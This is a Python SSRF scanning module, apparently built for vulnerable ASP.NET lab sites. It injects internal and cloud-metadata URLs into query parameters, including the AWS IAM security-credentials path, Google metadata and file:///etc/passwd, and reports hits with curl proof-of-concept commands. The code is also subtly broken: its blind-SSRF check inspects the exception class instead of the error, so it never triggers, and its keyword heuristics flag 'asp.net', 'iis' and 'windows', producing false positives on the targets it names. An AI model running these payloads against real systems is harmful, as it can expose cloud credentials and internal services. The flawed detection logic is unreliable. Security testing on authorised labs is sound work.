"""
Server-Side Request Forgery (SSRF) Detection - OWASP A10:2021
Improved for vulnerable ASP.NET labs like testaspnet.vulnweb.com
"""
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode
import time

class SSRFModule:
    def __init__(self, target_url: str, http_client: Any = None):
        self.target_url = target_url
        
        if http_client:
            self.http = http_client
        else:
            import requests
            self.http = requests

        # Strong SSRF payloads (internal + cloud + blind)
        self.payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/metadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            # Common parameter-based SSRF vectors
            "http://127.0.0.1:80",
            "http://127.0.0.1:8080",
            "file:///etc/passwd",           # if it supports file://
            "http://localhost/admin",       # try internal admin panels
        ]

    def test_ssrf(self, url: str, param: str) -> List[Dict[str, Any]]:
        findings = []
        
        try:
            # Get baseline response
            baseline_resp = self.http.get(url, timeout=6)
            baseline_length = len(baseline_resp.text)
            baseline_status = baseline_resp.status_code

            for payload in self.payloads:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[param] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                if params:
                    test_url += "?" + urlencode(params, doseq=True)

                try:
                    start_time = time.time()
                    resp = self.http.get(test_url, 
                                       timeout=12, 
                                       headers={'Metadata': 'true', 'Metadata-Flavor': 'Google'},
                                       allow_redirects=True)
                    duration = time.time() - start_time
                    
                    resp_text_lower = resp.text.lower()
                    
                    # Detection strategies
                    cloud_leak = any(x in resp_text_lower for x in [
                        'ami-id', 'instance-id', 'accountid', 'accesskey', 
                        'secretkey', 'google.internal', 'digitalocean', 'azure'
                    ])
                    
                    internal_access = any(x in resp_text_lower for x in [
                        '127.0.0.1', 'localhost', '::1', 'windows', 'iis', 'asp.net'
                    ])
                    
                    # Different behavior detection
                    significant_change = (
                        abs(len(resp.text) - baseline_length) > 80 or
                        resp.status_code != baseline_status or
                        duration > 4.0   # possible internal timeout
                    )

                    if cloud_leak or internal_access or significant_change:
                        name = "Server-Side Request Forgery (SSRF) - Cloud Metadata" if cloud_leak else "Server-Side Request Forgery (SSRF)"
                        severity = "critical" if cloud_leak else "high"
                        
                        findings.append({
                            "name": name,
                            "severity": severity,
                            "owasp_category": "A10:2021",
                            "url": url,
                            "parameter": param,
                            "confidence": 90 if cloud_leak else 70,
                            "technique": "SSRF Payload Injection",
                            "evidence": {
                                "payload": payload,
                                "response_length_diff": abs(len(resp.text) - baseline_length),
                                "status_code": resp.status_code,
                                "duration": round(duration, 2),
                                "cloud_leak": cloud_leak
                            },
                            "poc": f"curl \"{test_url}\"",
                            "remediation": "Validate and whitelist all URLs. Block requests to internal IPs (127.0.0.1, 169.254.169.254, etc.) and disable unnecessary redirects."
                        })
                        break  # One finding per parameter is sufficient
                        
                except Exception:
                    # Timeout or connection error can also indicate blind SSRF
                    if 'timeout' in str(Exception).lower():
                        findings.append({
                            "name": "Potential Blind SSRF",
                            "severity": "medium",
                            "owasp_category": "A10:2021",
                            "url": url,
                            "parameter": param,
                            "confidence": 60,
                            "technique": "Blind SSRF (Timeout)",
                            "evidence": {"payload": payload},
                            "remediation": "Implement proper URL validation and network segmentation"
                        })
                    continue
                    
        except Exception as e:
            print(f"[SSRF] Error testing {url}: {str(e)}")
        
        return findings

    def scan(self, urls: List[str]) -> List[Dict[str, Any]]:
        all_findings = []
        
        print(f"[SSRFModule] Testing {len(urls)} URLs for SSRF vulnerabilities...")
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if not params:
                # Try common SSRF parameter names if no query params exist
                for common_param in ["url", "image", "file", "proxy", "callback", "redirect", "dest"]:
                    findings = self.test_ssrf(url, common_param)
                    all_findings.extend(findings)
            else:
                for param in list(params.keys()):
                    findings = self.test_ssrf(url, param)
                    all_findings.extend(findings)
        
        print(f"[SSRFModule] Scan completed. Found {len(all_findings)} SSRF findings.")
        return all_findings
